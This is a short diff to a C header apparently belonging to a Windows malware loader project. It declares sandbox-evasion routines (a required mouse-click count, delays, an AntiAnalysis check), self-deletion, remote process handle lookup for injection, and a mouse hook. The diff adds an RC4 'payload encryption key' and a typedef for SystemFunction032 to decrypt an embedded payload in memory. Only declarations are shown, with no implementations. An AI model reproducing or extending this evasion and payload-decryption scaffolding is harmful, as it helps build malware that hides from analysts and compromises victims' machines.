@@ -21,6 +21,9 @@ extern DWORD g_dwMouseClicks;
 // Minimum click for passing anti-analysis
 #define REQUIRED_CLICKS 7
 
+// Payload encryption key
+extern UCHAR Rc4Key[];
+
 /*--------------------------------------------------------------------
   STRUCTURES
 --------------------------------------------------------------------*/
@@ -604,5 +607,19 @@ BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* 
 BOOL SelfDelete();
 LRESULT MouseHookCallback(int nCode, WPARAM wParam, LPARAM lParam);
 BOOL InstallMouseHook();
-BOOL Delay(DWORD dwMilliSeconds);
+BOOL DelayExec(DWORD dwMilliSeconds);
 BOOL AntiAnalysis(DWORD dwMilliSeconds);
+
+// Defined in Cryptor.c
+typedef struct _USTRING
+{
+	DWORD   Length;
+	DWORD   MaximumLength;
+	PVOID   Buffer;
+
+} USTRING, * PUSTRING;
+
+typedef NTSTATUS(NTAPI* fnSystemFunction032) (
+	struct USTRING* Img,
+	struct USTRING* Key
+	);
